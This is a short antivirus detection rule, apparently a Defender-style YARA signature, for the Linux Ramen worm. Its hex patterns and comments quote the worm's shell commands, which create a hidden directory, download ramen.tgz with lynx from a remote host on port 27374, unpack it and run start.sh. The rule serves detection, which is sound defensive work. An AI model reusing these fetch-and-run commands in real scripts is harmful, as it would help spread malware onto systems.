
rule Worm_Linux_Ramen_DS_MTB{
	meta:
		description = "Worm:Linux/Ramen.DS!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,05 00 05 00 04 00 00 02 00 "
		
	strings :
		$a_00_0 = {6d 6b 64 69 72 20 2f 75 73 72 2f 73 72 63 2f 2e 70 6f 6f 70 3b 63 64 20 2f 75 73 72 2f 73 72 63 2f 2e 70 6f 6f 70 } //01 00  mkdir /usr/src/.poop;cd /usr/src/.poop
		$a_00_1 = {65 63 68 6f 20 45 61 74 20 59 6f 75 72 20 52 61 6d 65 6e 21 20 7c 20 6d 61 69 67 20 2d 73 20 25 73 20 2d 63 20 25 73 20 25 73 } //01 00  echo Eat Your Ramen! | maig -s %s -c %s %s
		$a_00_2 = {6c 79 6e 78 20 2d 73 6f 75 72 63 65 20 68 74 74 70 3a 2f 2f 25 73 3a 32 37 33 37 34 20 3e 20 2f 75 73 72 2f 73 72 63 2f 2e 70 6f 6f 70 2f 72 61 6d 65 6e 2e 74 67 7a } //01 00  lynx -source http://%s:27374 > /usr/src/.poop/ramen.tgz
		$a_00_3 = {67 7a 69 70 20 2d 64 20 72 61 6d 65 6e 2e 74 67 7a 3b 74 61 72 20 2d 78 76 66 20 72 61 6d 65 6e 2e 74 61 72 3b 2e 2f 73 74 61 72 74 2e 73 68 } //00 00  gzip -d ramen.tgz;tar -xvf ramen.tar;./start.sh
		$a_00_4 = {5d 04 00 00 } //09 91 
	condition:
		any of ($a_*)
 
}